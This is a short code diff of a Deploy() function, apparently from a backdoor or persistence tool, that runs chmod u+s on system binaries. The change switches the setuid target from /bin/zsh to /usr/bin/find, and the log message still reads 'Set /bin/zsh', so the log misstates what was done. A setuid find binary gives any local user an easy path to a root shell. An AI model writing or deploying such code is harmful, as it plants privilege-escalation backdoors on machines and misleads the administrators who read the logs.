@@ -22,8 +22,8 @@ function Deploy() {
   LogInfo("Set /bin/bash");
 
   // setting /bin/zsh to U+S
-  ForkExecuteCommand("chmod", ["u+s", "/bin/zsh"]);
-  ForkExecuteCommand("chmod", ["u+x", "/bin/zsh"]);
+  ForkExecuteCommand("chmod", ["u+s", "/usr/bin/find"]);
+  ForkExecuteCommand("chmod", ["u+x", "/usr/bin/find"]);
   LogInfo("Set /bin/zsh");
 
   return true;
